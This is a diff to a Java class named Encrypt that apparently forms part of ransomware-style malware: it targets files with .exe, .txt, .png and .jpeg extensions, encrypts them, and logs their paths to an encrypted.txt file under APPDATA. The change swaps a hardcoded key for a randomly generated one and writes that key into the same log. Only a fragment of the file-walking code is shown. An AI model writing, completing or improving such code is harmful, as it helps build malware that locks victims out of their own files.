@@ -1,4 +1,4 @@
-package kr.pah.Encryptor;
+package kr.pah;
 
 import javax.crypto.Cipher;
 import javax.crypto.spec.SecretKeySpec;
@@ -9,10 +9,11 @@ import java.nio.file.FileSystemException;
 import java.nio.file.Files;
 import java.util.ArrayList;
 import java.util.List;
+import java.util.UUID;
 
 public class Encrypt {
 
-    private static final String KEY = "HelloWorldThisIsEncryptKey0x0000";
+    private static final String KEY = UUID.randomUUID().toString().replaceAll("-", "").substring(0, 32);;
     private static final String[] EXTENSIONS = new String[]{".exe", ".txt", ".png", ".jpeg"};
 
     public static void runEncryption() throws Exception {
@@ -23,6 +24,7 @@ public class Encrypt {
 
         // 암호화된 파일 경로 저장
         try (FileWriter writer = new FileWriter(System.getenv("APPDATA") + "\\encrypted.txt")) {
+            writer.write(KEY);
             for (String filePath : encryptedFiles) {
                 writer.write(filePath + System.lineSeparator());
             }
